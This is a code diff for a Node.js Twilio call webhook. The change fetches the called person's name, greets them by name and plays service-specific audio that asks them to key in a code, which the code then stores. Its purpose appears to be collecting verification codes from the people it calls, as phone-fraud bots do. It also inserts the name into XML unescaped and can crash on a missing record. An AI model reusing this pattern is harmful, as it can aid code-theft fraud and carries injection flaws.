@@ -15,7 +15,6 @@ module.exports = function(request, response) {
      */
     var input = request.body.RecordingUrl || request.body.Digits || 0;
     var callSid = request.body.CallSid;
-    var service = null;
 
     if (!!!callSid) {
         return response.status(200).json({
@@ -26,15 +25,18 @@ module.exports = function(request, response) {
     /**
      * On récupère le Service utilisé dans cet appel pour ensuite retourner le bon audio à utiliser
      */
-    db.get('SELECT service FROM calls WHERE callSid = ?', [callSid], (err, row) => {
+    db.get('SELECT service, name FROM calls WHERE callSid = ?', [callSid], (err, row) => {
         if (err) {
             return console.log(err.message);
         }
 
         /**
          * Au cas où le callSid n'est pas trouvé, on utilise l'audio par défaut
+         * Pareil pour le nom de la personne à appeler
          */
-        service = row == undefined ? 'default' : row.service;
+        const service = row == undefined ? 'default' : row.service;
+        const name = row.name == 'null' ? '' : row.name;
+
         /**
          * Au cas où le callSid est trouvé mais le service n'existe pas, on utilise l'audio par défaut
          */
@@ -50,7 +52,7 @@ module.exports = function(request, response) {
          * Ici l'on crée la réponse TwiML à renvoyer, en y ajoutant l'url de l'audio
          */
         const end = '<?xml version="1.0" encoding="UTF-8"?><Response><Play>' + endurl + '</Play></Response>';
-        const ask = '<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="8" numDigits="' + numdigits + '"><Play loop="4">' + askurl + '</Play></Gather></Response>';
+        const ask = '<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="8" numDigits="' + numdigits + '"><Say>Bonjour ' + name + ',</Say><Play loop="4">' + askurl + '</Play></Gather></Response>';
 
         /**
          * Si l'utilisateur à envoyé le code, alors l'ajouter à la base de donnée et renvoyer l'audio de fin : fin de l'appel
